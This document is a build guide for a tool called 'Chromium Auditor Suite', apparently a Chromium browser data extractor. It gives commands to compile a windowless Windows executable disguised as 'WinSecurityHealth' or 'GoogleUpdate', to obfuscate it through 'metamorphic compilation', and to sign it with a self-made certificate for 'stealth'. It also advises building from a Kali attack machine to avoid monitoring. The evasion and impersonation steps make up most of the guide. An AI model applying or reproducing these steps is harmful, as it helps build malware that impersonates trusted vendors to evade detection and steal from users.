# ⚙️ Professional Compilation Flows

> [!NOTE]
> **English Version** | [Versión en Español](COMPILATION_FLOWS.md)

This guide details the two recommended workflows to generate the final executable for the **Chromium Auditor Suite**, covering both hybrid and pure Linux/WSL environments.

---

## 🏗️ Flow A: Hybrid (Windows + WSL/Linux)

**Recommended for: Maximum stability and ease of use.**

This flow uses Windows for the heavy compilation lifting (where native APIs are present) and WSL/Linux for the security and stealth phase (digital signing).

### 1. Preparation on Windows (PowerShell)

Install the necessary dependencies:

```powershell
pip install pyarmor pyinstaller -r requirements.txt
```

### 2. Binary Compilation (Windows)

Generate the `.exe` using the automation script with identity spoofing (e.g., mimicking a Windows service):

```powershell
python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
```

*The result will be in `dist/ChromiumAuditor.exe`.*

### 3. Digital Signing (WSL/Linux)

Copy the file to your WSL environment and run the certification script:

```bash
bash autocert.sh dist/ChromiumAuditor.exe "YourSecurePassword"
```

---

## 🏗️ Flow B: Pure (WSL/Linux with Wine)

**Recommended for: Pentesting from isolated environments or distributions like Kali Linux.**

This flow allows generating a Windows executable without leaving Linux, emulating the Windows environment using Wine.

### 1. Wine Prefix Setup

Create a clean 64-bit environment to avoid conflicts:

```bash
export WINEPREFIX=$HOME/.wine_chromium
export WINEARCH=win64
winecfg  # Ensure the Windows version is set to 'Windows 10'
```

### 2. Installing Python for Windows in Wine

Download the official Windows installer (`python-3.x-amd64.exe`) from python.org and run it:

```bash
wine python-3.11.x-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
```

### 3. Installing Dependencies inside Wine

Use the emulated `pip` to install the Windows libraries:

```bash
wine python -m pip install --upgrade pip
wine python -m pip install pycryptodomex pywin32 requests pyarmor pyinstaller
```

> [!IMPORTANT]
> If `pywin32` fails, run this post-installation command:
> `wine python Scripts/pywin32_postinstall.py -install`

### 4. Metamorphic Compilation

Run the full process under Wine:

```bash
wine python ofuscator.py main.py
wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
```

### 5. In-Situ Signing

Sign the binary directly from your Linux terminal:

```bash
bash autocert.sh dist/ChromiumAuditor.exe
```

---

## 🛡️ Flow Comparison

| Feature | Flow A (Hybrid) | Flow B (Wine) |
| :--- | :--- | :--- |
| **Stability** | ⭐ Excellent | ⚠️ Moderate |
| **Simplicity** | ⭐ High | ⚠️ Low (Complex setup) |
| **Isolation** | ❌ Low | ⭐ High (All in Linux) |
| **Build Size** | ~18 MB | ~18 MB |

---

## ⚖️ Pentesting Recommendation

If you are operating from an attack machine (Kali Linux), **Flow B** allows you to keep your entire supply chain within Linux, minimizing the exposure of your development tools on Windows systems that might be monitored.

---
